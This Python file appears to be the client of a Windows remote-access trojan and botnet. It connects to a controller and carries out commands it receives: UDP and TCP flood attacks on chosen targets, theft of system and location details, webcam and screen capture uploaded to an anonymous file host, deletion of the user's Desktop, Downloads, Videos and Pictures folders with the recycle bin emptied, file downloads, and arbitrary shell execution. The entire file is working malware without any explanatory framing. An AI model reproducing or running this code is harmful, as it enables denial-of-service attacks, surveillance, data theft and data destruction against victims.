import socket, random, time, threading, os, pyautogui, geocoder, urllib, json, platform, cv2, winshell, win32com.client
from turtle import title
from anonfile import AnonFile
########## SETTINGS ########## 
ip = "127.0.0.1"
port = 8080
########## SETTINGS ##########
def connect():
 global client       
 try:       
  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  client.connect((ip, port))
 except:
        return connect()
   
connect()        
def udp():
        ddata = random._urandom(1024)   
        udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
        hst = (str(targh),int(tarhp))
        sec = time.time()
        while time.time()<=sec+int(dur): 
         try:       
          udps.sendto(ddata,hst )
         except:
                pass 
def tcp():
        dat = random._urandom(16)   
        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
        hst = (str(tcpip),int(tcpport))
        tcp.connect(hst)
        tcp.send(dat)
        sec = time.time()
        while time.time()<=sec+int(dur): 
         try:       
          tcp.send(dat)
         except Exception as e:
                pass
def info():
   try: 
    with urllib.request.urlopen("https://geolocation-db.com/json") as inf:
        data = json.loads(inf.read().decode())
        syscountry = data['country_name']
        syscity = data['city']
        sysip = data['IPv4']     
    sys = platform.uname()
   except: pass
   try:
     client.send(str.encode(f'-------------------------\n PC Name: {os.getlogin()}\n Ip: {sysip}\n Country: {syscountry}\n City: {syscity}\n System: {sys.system}\n Node Name: {sys.node}\n Processor: {sys.processor}\n Machine: {sys.machine}\n Release: {sys.release}\n Version: {sys.version}'))
   except: pass 

def dall():
    try:
     os.system(f"del C:\\Users\\{os.getlogin()}\\Desktop /F /Q")
    except: pass 
    try:
     os.system(f"del C:\\Users\\{os.getlogin()}\\Downloads /F /Q")
    except: pass 
    try:
     os.system(f"del C:\\Users\\{os.getlogin()}\\Videos /F /Q") 
    except: pass 
    try:
     os.system(f"del C:\\Users\\{os.getlogin()}\\Pictures /F /Q")  
    except: pass 
    try:
     winshell.recycle_bin().empty(confirm=False, show_progress=False, sound=False)
    except: pass 

def tts():
    text = str(client.recv(4096), "utf-8")
    sp = win32com.client.Dispatch("SAPI.SpVoice")
    sp.speak(text)

while True: 
      try:
        data = client.recv(1024).decode("utf-8")
        if data == 'udp':
            targh = str(client.recv(1024), 'utf-8')
            tarhp = str(client.recv(1024), 'utf-8')
            dur = str(client.recv(1024), 'utf-8')
            print(targh, tarhp, dur)
            sec = time.time()
            while time.time()<=sec+int(dur):        
             threading.Thread(target = udp).start()
             
        elif data == 'dall':
          dall()    

        elif data == 'info':
          info()

        elif data == 'tts':
          tts()

        elif data == 'webcam':
         anon = AnonFile()
         try:
             camera = cv2.VideoCapture(0)
             return_value, image = camera.read()
             filename = f'{os.getlogin()}_screen_{random.randint(10, 1000)}.jpg'
             cv2.imwrite(filename, image)   
             upload = anon.upload(filename)
             client.send(str.encode(upload.url.geturl()))
             os.remove(filename)
         except:
                pass           
 
        elif data == 'upload':
          anon = AnonFile()
          link = str(client.recv(4096), 'utf-8')
          print(link)
          anon.download(link)

        elif data == 'cwd':
          try:
            client.send(str.encode(f'{os.getlogin()}: {os.getcwd()}'))
          except Exception as e:
            print(e)   

        elif data == 'msgbox':
          title = str(client.recv(1024), 'utf-8')
          message = str(client.recv(1024), 'utf-8')
          pyautogui.alert(title=title, text=message)
          
        elif data == 'tcp':
           tcpip = str(client.recv(1024), 'utf-8')
           tcpport = str(client.recv(1024), 'utf-8')
           dur = str(client.recv(1024), 'utf-8')        
           sec = time.time()
           while time.time()<=sec+int(dur):        
             threading.Thread(target = tcp).start()   
 
        elif data == 'kill':
          filen = os.path.basename(__file__)
          filen = filen.replace('py', 'exe')
          os.system(f'Taskkill /IM {filen} /F ')
        elif data == 'screen':
            anon = AnonFile()
            try:
             screen = pyautogui.screenshot()
             filename = f'{os.getlogin()}_screen_{random.randint(10, 1000)}.jpg'
             screen.save(filename)   
             upload = anon.upload(filename)
             client.send(str.encode(upload.url.geturl()))
             os.remove(filename)
            except:
                pass 

        elif data == 'shell':
            shellcmd = str(client.recv(1024), 'utf-8') 
            os.system(shellcmd)

        elif data == 'botsn':
              try:
                client.send(str.encode(os.getlogin()))     
                client.send(str.encode(socket.gethostname()))   
                g = geocoder.ip('me')
                client.send(str.encode(g.city)) 
              except:
                pass  
      except Exception as e:
        connect()
